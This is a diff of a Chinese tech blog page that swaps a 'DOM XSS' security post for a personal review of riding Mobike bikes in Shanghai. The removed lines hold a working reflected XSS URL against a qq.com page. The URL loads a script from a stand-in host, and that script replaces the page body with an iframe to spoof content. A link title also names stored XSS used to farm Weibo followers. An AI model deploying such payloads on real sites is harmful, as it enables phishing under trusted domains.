@@ -5,11 +5,11 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>DOM XSS - 移动开发技术</title>
+  <title>Mobike体验 - 移动开发技术</title>
   <meta name="author" content="jason">
 
   
-  <meta name="description" content="因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面 http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx. &hellip;">
+  <meta name="description" content="今天到上海出差，第一次来，想到处随意逛逛，单车是个很不错的选择，所以注册了mobike。 今天骑了三段： 第一段2km，耗时19m。这一段主要是在上海交大校园里，人少路况好，体验非常不错。 第二段3km，耗时22m。这一段是从酒店去外滩，在半路上被交警拦下，有一段路不准骑车，于是改乘地铁。 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -18,7 +18,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://jason5.cn/blog/dom-xss.html">
+  <link rel="canonical" href="http://jason5.cn/blog/mobiketi-yan.html">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <link href="/atom.xml" rel="alternate" title="移动开发技术" type="application/atom+xml">
@@ -81,7 +81,7 @@ $(document).bind('DOMNodeInserted', function(event) {
   
   <header>
     
-      <h1 class="entry-title">DOM XSS</h1>
+      <h1 class="entry-title">Mobike体验</h1>
     
     
       <p class="meta">
@@ -90,7 +90,7 @@ $(document).bind('DOMNodeInserted', function(event) {
 
 
 
-<time class='entry-date' datetime='2016-08-03T11:04:09+08:00'><span class='date'>2016 年8 月3 日</span> <span class='time'>11:04 am</span></time>
+<time class='entry-date' datetime='2016-11-13T21:25:26+08:00'><span class='date'>2016 年11 月13 日</span> <span class='time'>9:25 pm</span></time>
         
         
           | <a href="#comments">Comments</a>
@@ -100,43 +100,24 @@ $(document).bind('DOMNodeInserted', function(event) {
   </header>
 
 
-<div class="entry-content"><p>因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面</p>
+<div class="entry-content"><p>今天到上海出差，第一次来，想到处随意逛逛，单车是个很不错的选择，所以注册了mobike。</p>
 
-<!--more-->
+<p>今天骑了三段：</p>
 
+<p>第一段2km，耗时19m。这一段主要是在上海交大校园里，人少路况好，体验非常不错。</p>
 
-<p><a href="http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E">http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E</a></p>
+<p>第二段3km，耗时22m。这一段是从酒店去外滩，在半路上被交警拦下，有一段路不准骑车，于是改乘地铁。这一段由于是在马路上，没有专门的自行车道，骑行感受一般。不过最难忍受的是这个车骑久了不舒服，座位对我来说比较偏矮，发不上力，且久了容易酸，下地铁台阶的时候感觉都快跪下去了。</p>
 
-<p><img src="http://jason5.cn/images/xss-dom.png" alt="" /></p>
+<p>第三段7km，耗时49m。从南京路步行街到酒店。跟第二段类似，没有专用自行车道，不停在人行道和马路边缘穿行，影响骑行速度。这次我骑得比较慢，也可能更适应了，腿酸的感受稍微弱一点。</p>
 
-<p>page解码后为</p>
+<p>总体感受：
+1. 方便，随停真的是太方便了，完全不操心。
+2. 用的人挺多的，上海和深圳都是这样。
+3. lite版单车还比较少，一般附近难以找到，看起来可能会好骑一点，因为更轻，还没有体验过。
+4. app做得不错，功能简洁易用，单车定位比较准。
+5. 在北京这种有专用自行车道的城市，发展会更好，而对于没有骑行环境的城市，例如重庆，基本就搞不起来了。</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="s2">&quot;&gt;&lt;script src=&quot;</span><span class="nx">http</span><span class="o">:</span><span class="c1">//xxxx.com/yy.js&quot;&gt;&lt;/script&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>yy.js的内容</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span><span class="p">(){</span>
-</span><span class='line'>  <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">title</span><span class="o">=</span><span class="s2">&quot;XSS test&quot;</span><span class="p">;</span>
-</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">bgColor</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="p">;</span>
-</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">fgColor</span><span class="o">=</span><span class="s2">&quot;white&quot;</span><span class="p">;</span>
-</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s2">&quot;&lt;iframe src=&#39;http://www.qqdx.albbz.cn/&#39; width=&#39;100%&#39; height=&#39;100%&#39;&gt;&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>原始页面内容
-<a href="http://app.2008.qq.com/ppzj/view_dh.php?page=1">http://app.2008.qq.com/ppzj/view_dh.php?page=1</a></p>
-
-<p><img src="http://jason5.cn/images/xss-dom1.png" alt="" /></p>
+<p>经过今天的体验，总体来讲感觉不错，从最以前的完全不看好，到现在觉得稍微觉得有戏。以后有需要会继续用。</p>
 </div>
 
 
@@ -152,12 +133,12 @@ $(document).bind('DOMNodeInserted', function(event) {
 
 
 
-<time class='entry-date' datetime='2016-08-03T11:04:09+08:00'><span class='date'>2016 年8 月3 日</span> <span class='time'>11:04 am</span></time>
+<time class='entry-date' datetime='2016-11-13T21:25:26+08:00'><span class='date'>2016 年11 月13 日</span> <span class='time'>9:25 pm</span></time>
       
 
 <span class="categories">
   
-    <a class='category' href='/blog/categories/security/'>security</a>
+    <a class='category' href='/blog/categories/other/'>other</a>
   
 </span>
 
@@ -173,10 +154,10 @@ $(document).bind('DOMNodeInserted', function(event) {
     
     <p class="meta">
       
-        <a class="basic-alignment left" href="/blog/fan-she-xing-xss.html" title="Previous Post: 反射型XSS">&laquo; 反射型XSS</a>
+        <a class="basic-alignment left" href="/blog/li-yong-traceviewyou-hua-androidying-yong-liu-chang-du.html" title="Previous Post: 利用traceview优化Android应用流畅度">&laquo; 利用traceview优化Android应用流畅度</a>
       
       
-        <a class="basic-alignment right" href="/blog/xssying-yong-wei-bo-shua-fen.html" title="Next Post: 存储型XSS应用-微博刷粉">存储型XSS应用-微博刷粉 &raquo;</a>
+        <a class="basic-alignment right" href="/blog/mobiketi-yan-xu.html" title="Next Post: mobike体验续">mobike体验续 &raquo;</a>
       
     </p>
   </footer>
@@ -186,7 +167,7 @@ $(document).bind('DOMNodeInserted', function(event) {
   <section>
     <h1>Comments</h1>
     <div id="comments" aria-live="polite"><!-- Duoshuo Comment BEGIN -->
-<div class="ds-thread" data-title="DOM XSS"></div>
+<div class="ds-thread" data-title="Mobike体验"></div>
 <script type="text/javascript">
   var duoshuoQuery = {short_name:"jason5cn"};
   (function() {
